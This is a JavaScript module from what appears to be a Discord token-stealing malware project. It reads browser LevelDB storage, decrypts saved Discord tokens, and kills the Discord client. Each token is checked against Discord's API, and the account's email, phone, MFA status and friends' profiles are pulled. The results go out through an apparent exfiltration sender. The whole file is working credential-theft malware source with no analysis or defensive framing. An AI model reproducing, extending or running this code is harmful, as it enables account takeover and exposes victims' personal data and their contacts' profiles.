"use strict";

const axios = require("axios");
const fs = require("fs");
const path = require("path");
const configConstants = require("../config/constants");
const coreCrypto = require("../core/crypto");
const utilsFile = require("../utils/file");
const apiSender = require("../api/sender");
const injection = require("./injection");
const browsersFirefox = require("../browsers/firefox");

async function safeStorageSteal(browserPath, browserName) {
  await injection.dckill();
  const tokens = [];
  const encryptionKey = await coreCrypto.getEncryptionKey(browserPath);
  
  if (!encryptionKey) return [];

  const dbPaths = utilsFile.findLevelDBPaths(browserPath);
  for (const dbPath of dbPaths) {
    try {
      const files = fs.readdirSync(dbPath);
      for (const file of files) {
        if (!file.endsWith(".log") && !file.endsWith(".ldb")) continue;
        
        const filePath = path.join(dbPath, file);
        try {
          const content = fs.readFileSync(filePath, "utf8");
          const lines = content.split("\n");
          for (const line of lines) {
            if (line.trim()) {
              const matches = line.match(/dQw4w9WgXcQ:[^"\s]+/g);
              if (matches) {
                for (let match of matches) {
                  match = match.replace(/\\$/, "");
                  const decryptedToken = coreCrypto.decryptToken(match, encryptionKey);
                  if (decryptedToken && !tokens.some(t => t[0] === decryptedToken && t[1] === browserName)) {
                    tokens.push([decryptedToken, browserName]);
                  }
                }
              }
            }
          }
        } catch (e) {
          apiSender.sendGenericMessage("" + e);
        }
      }
    } catch (e) {
      apiSender.sendGenericMessage("" + e);
    }
  }
  return tokens;
}

async function simpleSteal(browserPath, browserName) {
  await injection.dckill();
  const tokens = [];
  const dbPaths = utilsFile.findLevelDBPaths(browserPath);
  for (const dbPath of dbPaths) {
    try {
      const files = fs.readdirSync(dbPath);
      for (const file of files) {
        if (!file.endsWith(".log") && !file.endsWith(".ldb")) continue;
        const filePath = path.join(dbPath, file);
        try {
          const content = fs.readFileSync(filePath, "utf8");
          const lines = content.split("\n");
          for (const line of lines) {
            if (line.trim()) {
              const matches = line.match(/[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}/g);
              if (matches) {
                for (const match of matches) {
                  if (!tokens.some(t => t[0] === match && t[1] === browserName)) {
                    tokens.push([match, browserName]);
                  }
                }
              }
            }
          }
        } catch (e) {
          apiSender.sendGenericMessage("" + e);
        }
      }
    } catch (e) {
      apiSender.sendGenericMessage("" + e);
    }
  }
  return tokens;
}

async function getTokens(browserName, browserPath) {
  let tokens = await safeStorageSteal(browserPath, browserName);
  if (browserName === "Firefox") {
    tokens = await browsersFirefox.firefoxSteal(browserPath, browserName);
  } else if (tokens.length === 0) {
    tokens = await simpleSteal(browserPath, browserName);
  }
  return tokens;
}

async function getFriends(token) {
  try {
    const response = await axios.get("https://discord.com/api/v9/users/@me/relationships", {
      headers: {
        Authorization: token.trim(),
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        Referer: "https://discord.com/channels/@me",
        Accept: "*/*"
      },
      timeout: 10000
    });
    if (response.data && Array.isArray(response.data)) {
      return response.data.filter(f => f.type === 1);
    }
    return [];
  } catch (e) {
    return [];
  }
}

async function getFriendProfiles(token) {
  try {
    const cleanToken = token.trim();
    const friends = await getFriends(cleanToken);
    const profiles = [];
    for (const friend of friends) {
      if (!friend || !friend.id) continue;
      try {
        const response = await axios.get("https://discord.com/api/v9/users/" + friend.id + "/profile", {
          headers: {
            Authorization: cleanToken,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            Referer: "https://discord.com/channels/@me",
            Accept: "*/*"
          },
          timeout: 10000
        });
        profiles.push({
          relationship: friend,
          profile: response.data || null
        });
      } catch (e) {
        profiles.push({
          relationship: friend,
          profile: null
        });
      }
    }
    return profiles;
  } catch (e) {
    return [];
  }
}

async function validateToken(token) {
  try {
    const cleanToken = token.trim();
    if (cleanToken.length < 50) {
      return { valid: false, reason: "Invalid token format" };
    }
    const response = await axios.get("https://discord.com/api/v9/users/@me", {
      headers: {
        Authorization: cleanToken,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        Referer: "https://discord.com/channels/@me",
        Accept: "*/*"
      },
      timeout: 10000
    });
    const userData = response.data;
    if (userData && userData.id && userData.username) {
      const profileResponse = await axios.get("https://discord.com/api/v9/users/" + userData.id + "/profile", {
        headers: {
          Authorization: cleanToken,
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
          Referer: "https://discord.com/channels/@me",
          Accept: "*/*"
        },
        timeout: 10000
      });
      const friendsData = await getFriendProfiles(cleanToken);
      const fullUserInfo = {
        ...profileResponse.data,
        email: userData.email,
        phone: userData.phone,
        mfa_enabled: userData.mfa_enabled
      };
      return {
        valid: true,
        userInfo: fullUserInfo,
        friends: friendsData
      };
    }
    return { valid: false, reason: "Invalid user data" };
  } catch (e) {
    return {
      valid: false,
      reason: e.response ? "HTTP " + e.response.status : e.message
    };
  }
}

async function collectValidDiscordTokens() {
  const validTokens = [];
  for (const [name, pth] of Object.entries(configConstants.PATHS)) {
    if (!fs.existsSync(pth)) continue;
    const foundTokens = await getTokens(name, pth);
    for (const [token, source] of foundTokens) {
      if (validTokens.some(t => t[0] === token)) continue;
      try {
        const validation = await validateToken(token);
        if (validation && validation.valid) {
          validTokens.push([token, source, validation]);
        }
      } catch (e) {
        apiSender.sendGenericMessage("" + e);
      }
    }
  }
  return validTokens;
}

async function stealTokens() {
  await injection.dckill();
  const allValidTokens = await collectValidDiscordTokens();
  for (const [token, source, data] of allValidTokens) {
    try {
      await apiSender.sendDiscordToken(token, data.userInfo, data.friends);
    } catch (e) {
      apiSender.sendGenericMessage("" + e);
    }
  }
}

exports.safeStorageSteal = safeStorageSteal;
exports.simpleSteal = simpleSteal;
exports.getTokens = getTokens;
exports.getFriends = getFriends;
exports.getFriendProfiles = getFriendProfiles;
exports.validateToken = validateToken;
exports.collectValidDiscordTokens = collectValidDiscordTokens;
exports.stealTokens = stealTokens;
